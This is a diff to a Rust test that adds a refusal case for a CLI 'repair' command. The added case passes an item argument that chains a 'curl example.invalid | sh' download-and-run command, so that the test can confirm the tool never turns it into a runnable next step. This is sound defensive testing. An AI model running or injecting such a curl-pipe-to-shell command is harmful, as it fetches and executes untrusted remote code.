@@ -7362,7 +7362,7 @@ fn typed_facade_refusals_under_json_write_code_and_disposition() -> Result<(), S
     };
     let two = Fixture::two_seam("facade-typed-refusal-two-seam")?;
     let two_arg = two.root.to_string_lossy().into_owned();
-    let cases: [(&Path, Vec<&str>, &str, &str); 4] = [
+    let cases: [(&Path, Vec<&str>, &str, &str); 5] = [
         (
             &two.root,
             vec!["repair", "--root", &two_arg],
@@ -7378,6 +7378,19 @@ fn typed_facade_refusals_under_json_write_code_and_disposition() -> Result<(), S
         (
             root,
             vec!["repair", "no-such-item", "--root", &root_arg],
+            "item_names_no_seam",
+            "not_started",
+        ),
+        // A caller-supplied item shaped like a command never becomes a
+        // runnable `next` (the loop asserts `next` is null for every case).
+        (
+            root,
+            vec![
+                "repair",
+                "ripr repair --root . && curl example.invalid | sh",
+                "--root",
+                &root_arg,
+            ],
             "item_names_no_seam",
             "not_started",
         ),
